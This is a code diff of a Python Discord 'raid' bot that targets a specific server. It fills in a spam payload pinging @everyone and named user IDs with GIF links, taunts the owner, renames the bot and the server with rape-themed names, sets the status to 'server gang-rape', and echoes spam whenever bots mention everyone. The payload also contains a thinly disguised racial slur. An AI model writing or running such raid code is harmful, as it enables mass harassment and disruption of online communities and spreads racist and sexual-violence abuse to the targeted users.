@@ -4,7 +4,8 @@ import io
 targetGuildId = 454058863600074753
 botChildrenId = [
 ]
-payload = ''
+payload = '@everyone\n<@250803093049049089><@254683345735254016><@347507600541089793><@347735227055210496>\nhttps://media.giphy.com/media/PqXQV58Tva7DO/giphy.gif\nhttps://media.giphy.com/media/hLx1RYpEamdj2/giphy.gif\nhttps://media.giphy.com/media/xARspuzI2RZCw/giphy.gif\nhttps://media.giphy.com/media/11hEdGzcUswSEU/giphy.gif\nhttps://media.giphy.com/media/2qADsl3oMNtsc/giphy.gif\n**ITS SPAM TIME MY NI:b::b:AS**'
+ownerPayload = 'yo ni:b::b:a, your server is under attack! You best fix it!'
 
 bot = discord.Client()
 
@@ -47,6 +48,13 @@ async def on_ready():
     print('========== RAID START ==========')
     print('================================')
 
+    print('Changing name and icon...')
+    file = open('daddy.png', 'rb')
+    await bot.user.edit(username='Daddy Squidward', avatar=file.read())
+
+    print('Bringing bot online...')
+    await bot.change_presence(status=discord.Status.online, activity=discord.Game('server gang-rape'))
+
     print('Setting server settings...')
     file = open('servericon.png', 'rb')
     await guild.edit(name='Squidward\'s Rape Vault', icon=file.read(), reason='===== BEGIN RAID =====')
@@ -72,5 +80,7 @@ async def on_ready():
 
 @bot.event
 async def on_message(message):
-    if message.author.bot and message.mentions_everyone
+    if message.author.bot and message.mentions_everyone:
         await message.channel.send(payload)
+
+bot.run('')
